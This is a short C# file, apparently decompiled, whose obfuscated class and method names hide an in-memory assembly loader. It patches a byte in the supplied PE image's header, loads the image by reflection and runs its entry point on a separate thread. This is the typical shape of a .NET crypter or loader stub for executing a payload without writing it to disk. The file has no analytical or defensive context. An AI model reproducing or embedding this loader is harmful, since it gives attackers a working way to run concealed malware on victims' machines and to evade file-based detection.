using System;
using System.Reflection;
using System.Security;
using System.Threading;

namespace FileCodeGroup;

public static class FileCodeGroupFileCodeGroup
{
	[SuppressUnmanagedCodeSecurity]
	private delegate object c__DisplayClass0_02(object TV_INSERTSTRUCT, object[] ModuleHandle);

	public static void SerTrace(byte[] UnionCodeGroup)
	{
		object[] ModuleHandle = null;
		int num = BitConverter.ToInt32(UnionCodeGroup, 60);
		Buffer.SetByte(UnionCodeGroup, num + 920, 2);
		Assembly assembly = Thread.GetDomain().Load(UnionCodeGroup);
		MethodInfo Resource = assembly.EntryPoint;
		if (Resource.GetParameters().Length > 0)
		{
			object[] array = new object[1];
			string[] array2 = (string[])(array[0] = new string[1]);
			ModuleHandle = array;
		}
		Thread endianness = new Thread((ThreadStart)delegate
		{
			Thread.BeginThreadAffinity();
			Thread.BeginCriticalRegion();
			c__DisplayClass0_02 c__DisplayClass0_ = Resource.Invoke;
			c__DisplayClass0_(null, ModuleHandle);
			Thread.EndCriticalRegion();
			Thread.EndThreadAffinity();
		});
		TypeLibVarFlags(endianness);
	}

	public static void TypeLibVarFlags(Thread Endianness)
	{
		Endianness.Start();
	}
}
